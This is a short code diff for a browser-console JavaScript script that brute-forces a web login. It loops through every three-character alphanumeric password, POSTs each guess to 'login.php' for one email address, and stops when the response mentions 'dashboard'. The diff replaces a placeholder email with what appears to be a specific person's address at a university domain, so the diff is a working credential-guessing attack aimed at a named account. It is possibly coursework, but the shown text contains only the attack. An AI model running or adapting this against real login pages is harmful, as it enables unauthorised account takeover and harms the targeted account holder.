@@ -1,3 +1,8 @@
+(async()=>{window.stop=false;const email='lucas@fontys.nl';const chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(const a of chars){for(const b of chars){for(const c of chars){if(window.stop)return;const pw=a+b+c;const r=await fetch('login.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email='+encodeURIComponent(email)+'&password='+encodeURIComponent(pw)});const t=await r.text();console.log(pw,r.status);if(t.includes('dashboard')||r.url.includes('dashboard')){console.log('GEVONDEN:',pw);window.stop=true;return;}}}}})();
+
+
+
+
 (async () => {window.stop = falseconst email = 'VUL-HIER-TESTEMAIL-IN'const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'for(const a of chars){ for(const b of chars){  for(const c of chars){   if(window.stop) return   const pw = a+b+c   const r = await fetch('login.php',{     method:'POST',     headers:{'Content-Type':'application/x-www-form-urlencoded'},     body: 'email='+encodeURIComponent(email)+'&password='+encodeURIComponent(pw)   })   const t = await r.text()   console.log(pw, r.status)   if(t.includes('dashboard') || r.url.includes('dashboard')){     console.log('GEVONDEN:', pw); window.stop=true; return   }  } }}})()
 
 
